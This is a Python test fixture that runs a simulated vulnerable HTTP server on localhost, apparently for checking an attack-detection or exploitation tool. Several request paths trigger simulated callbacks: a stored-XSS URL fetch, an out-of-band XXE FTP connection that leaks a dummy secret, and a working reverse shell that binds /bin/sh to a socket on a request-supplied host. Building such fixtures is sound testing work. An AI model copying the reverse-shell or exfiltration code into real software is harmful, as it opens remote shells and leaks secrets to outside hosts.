#!/usr/bin/env python3

from urllib import request
import ftplib
import http.server
import os
import socket
import socketserver
import subprocess
import threading


class Victim(http.server.BaseHTTPRequestHandler):

    DEFAULT_RESPONSE = '<html><head><title>Test</title></head><body>&nbsp;</body></html>'

    def with_xss(self, url):
        """Simulate launching stored XSS

        """
        request.urlopen(url)

    def with_xxe(self, host, port):
        """Simulate out-of-band XXE using FTP

        """
        ftp = ftplib.FTP()
        ftp.connect(host, int(port))
        ftp.login()
        ftp.cwd('SecretKey=THIS_IS_SECRET;')
        ftp.quit()

    def with_sql(self, host, port):
        """Simulate reverse shell using SQL

        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((host, int(port)))
        except ConnectionRefusedError:
            print('Listener started on the attacking machine?')
        else:
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)
            subprocess.call(['/bin/sh', '-i'])

    def send_content(self, status_code=200, content_type='text/html', content=DEFAULT_RESPONSE):
        self.send_response(status_code)
        self.send_header('Content-Type', content_type)
        self.send_header('Content-Length', str(len(content)))
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(bytes(content, 'utf-8'))
        self.wfile.flush()

    def do_GET(self):
        if self.path.startswith('/userid/'):
            self.send_content(content='666')
        else:
            self.send_content()

    def do_POST(self):
        length = int(self.headers.get('Content-Length'))
        body = self.rfile.read(length)
        self.send_content()
        if self.path == '/test/':
            url = body[18:-10].decode('utf-8')
            threading.Thread(target=self.with_xss, args=(url,)).start()
        elif self.path == '/xml-import/':
            uri = body[44:-12].decode('utf-8')
            host, port = uri[6:].split(':')
            threading.Thread(target=self.with_xxe, args=(host, port)).start()
        elif self.path == '/query/':
            uri = body[-14:].decode('utf-8')
            host, port = uri.split('+')
            threading.Thread(target=self.with_sql, args=(host, port)).start()


example = socketserver.TCPServer(('127.0.0.1', 8008), Victim)
example.serve_forever()
